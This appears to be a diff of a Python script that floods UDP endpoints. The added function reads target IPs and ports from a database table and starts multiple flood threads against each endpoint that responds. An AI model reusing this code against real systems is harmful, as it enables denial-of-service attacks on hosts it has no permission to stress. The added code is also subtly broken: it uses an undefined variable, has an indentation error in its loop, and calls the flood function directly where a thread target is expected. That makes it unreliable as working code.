@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-
 import random
 import socket
 import threading
@@ -101,10 +99,13 @@ def scan_endpoints():
         db_write(sql,params)
         time.sleep(sleep_between_flood)
 
-scan_endpoints()
-#endpoint_status=check_udp_endpoint(udp_socket_ip,udp_socket_port)
-#print("udp endpoint {0}:{1} health is {2}".format(udp_socket_ip,udp_socket_port,endpoint_status),flush=True)
-#if endpoint_status=="true":
-#  for y in range(num_of_flood_threads):
-#   _thread=threading.Thread(target=flood_endpoint(udp_socket_ip,udp_socket_port))
-#   _thread.start()
+def flood_endpoints():
+  sql = """select ip,port from target_endpoint;"""
+  params = []
+  rows = list(db_read(sql,params))
+  for ipv4 in rows:
+    status=check_udp_endpoint(ipv4[0],port) 
+    if status=="true":
+      for y in range(num_of_flood_threads):
+      _thread=threading.Thread(target=flood_endpoint(ipv4[0],port))
+      _thread.start()
